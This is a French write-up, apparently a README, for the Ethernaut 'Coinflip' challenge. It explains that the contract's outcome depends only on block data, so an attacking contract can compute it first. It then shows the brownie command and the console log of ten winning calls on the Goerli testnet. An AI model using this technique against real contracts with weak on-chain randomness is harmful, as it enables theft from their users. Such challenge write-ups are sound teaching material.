# Coinflip

## Objectif
L'objectif de ce challenge est de 'deviner' correctement 10 fois le résultat de coinflip.

## Deviner le résultat de coinflip

La méthode [`flip` du contrat](contracts/coinflip.sol#17) utilise la variable `lastHash` pour éviter que `flip` ne soit appellé plusieurs fois pour le même bloc.

La valeur résultat de `flip` étant seulement dépendant du numéro de bloc de la transaction, il est possible de calculer ce résultat par un autre contrat et faire l'appel à `flip` ensuite.

La méthode de calcul a été copié dans la [méthode `hack` du contrat `CoinFlipAttack`](contracts/coinflipAttack.sol#16)

Une fois le calcul effectué, l'appel à[`flip`](contracts/coinflipAttack.sol#22) est réalisé.


## Exécution du script d'attaque
Afin de pouvoir agir sur la chaine `goerli`, il est nécessaire de créer un fichier `.env` contenant la clé de projet [Infura](https://infura.io/) et la valeur de la clé privée du compte utilisé pour le challenge:
```shell
export WEB3_INFURA_PROJECT_ID='AABBCCDD.......'
export PRIVATE_KEY='0xDEADBEEFCACA...'
```

En utilisant la console sur le site d'[ethernaut openzeppelin](https://ethernaut.openzeppelin.com/level/0xae9677ff69efB3C1B9559C8F2A9ED6a2212148e3) on récupère l'adresse du contrat déployé pour lancer l'attaque ainsi:
```bash
$ brownie run ./scripts/attack.py main "0x8D19ac38476b28CBA1D155ded3f04d155906F62C" --network goerli
```
```console
Brownie v1.19.0 - Python development framework for Ethereum

CoinflipProject is the active project.

Running 'scripts/attack.py::main'...
Target contract: 0x8D19ac38476b28CBA1D155ded3f04d155906F62C
Transaction sent: 0x297b8ac2d8bfd2e4e5cef96fcbd2a39de520c4b58a8a8d8955fd54705f195b5e
  Gas price: 61.515771471 gwei   Gas limit: 281425   Nonce: 23
  CoinFlipAttack.constructor confirmed   Block: 7838826   Gas used: 255841 (90.91%)
  CoinFlipAttack deployed at: 0xdFad5f7FCdCb2C787590B7FCD30763EC6562863D

Attack address: 0xdFad5f7FCdCb2C787590B7FCD30763EC6562863D
Transaction sent: 0x45dbab8624d226db9b3f885841d326ae124f19356efe1e9c6a06152307a4438a
  Gas price: 60.020237243 gwei   Gas limit: 90000   Nonce: 24
  CoinFlipAttack.hack confirmed   Block: 7838828   Gas used: 75975 (84.42%)

Transaction sent: 0x49d393a4675843c4c339b79141e1a9fafefbc1f2e9bc96f653e4f8b8f81b473e
  Gas price: 52.332410145 gwei   Gas limit: 90000   Nonce: 25
  CoinFlipAttack.hack confirmed   Block: 7838829   Gas used: 41775 (46.42%)

Transaction sent: 0x09c52a15e907c74f7a139b1da85df62afe6dc0542078bccd0cba2003e3473c2e
  Gas price: 52.177373665 gwei   Gas limit: 90000   Nonce: 26
  CoinFlipAttack.hack confirmed   Block: 7838849   Gas used: 41775 (46.42%)

Transaction sent: 0x62af571b13b64045d8144d39f772f19e2d9528f3444902ab571da924fe485adf
  Gas price: 52.085534483 gwei   Gas limit: 90000   Nonce: 27
  CoinFlipAttack.hack confirmed   Block: 7838853   Gas used: 41755 (46.39%)

Transaction sent: 0xcaaa987453e5ce4b19bd610b878d9beeb592c48e69938a99688fa94ed72db82d
  Gas price: 49.137453031 gwei   Gas limit: 90000   Nonce: 28
  CoinFlipAttack.hack confirmed   Block: 7838902   Gas used: 41775 (46.42%)

Transaction sent: 0x16030db248735a00d8539b3cf83ff6cdbcf2510fa109a3a8cc15cfde1f3b3eb2
  Gas price: 48.195478172 gwei   Gas limit: 90000   Nonce: 29
  CoinFlipAttack.hack confirmed   Block: 7838918   Gas used: 41775 (46.42%)

Transaction sent: 0x7d1d57d124715e37642c597dd083437ddb8b66e278287431527bcd6e09978c5e
  Gas price: 46.027368937 gwei   Gas limit: 90000   Nonce: 30
  CoinFlipAttack.hack confirmed   Block: 7838921   Gas used: 41755 (46.39%)

Transaction sent: 0x7cc3679df9f22bab113aa9350fbb515d2606e9a2c76e52f930f66ce4d1063439
  Gas price: 44.92033064 gwei   Gas limit: 90000   Nonce: 31
  CoinFlipAttack.hack confirmed   Block: 7838927   Gas used: 41755 (46.39%)

Transaction sent: 0xe404363ebbc3c15b749bfb6e1c465a00add12fa22a51ac681338ac39443b96bf
  Gas price: 44.710439045 gwei   Gas limit: 90000   Nonce: 32
  CoinFlipAttack.hack confirmed   Block: 7838929   Gas used: 41775 (46.42%)

Transaction sent: 0x9524e20cb0e4e4358e9164f22d612b011532028143f2d6d80432e353088af784
  Gas price: 44.829616695 gwei   Gas limit: 90000   Nonce: 33
  CoinFlipAttack.hack confirmed   Block: 7838931   Gas used: 41755 (46.39%)

Nb ok: 10
Transaction sent: 0xb39eed9067c3b7eba73a4030f8eda17df99f005e13075110d9ac2f1c6b6e35f0
  Gas price: 45.014987221 gwei   Gas limit: 28821   Nonce: 34
  CoinFlipAttack.destroy confirmed   Block: 7838933   Gas used: 26201 (90.91%)

```


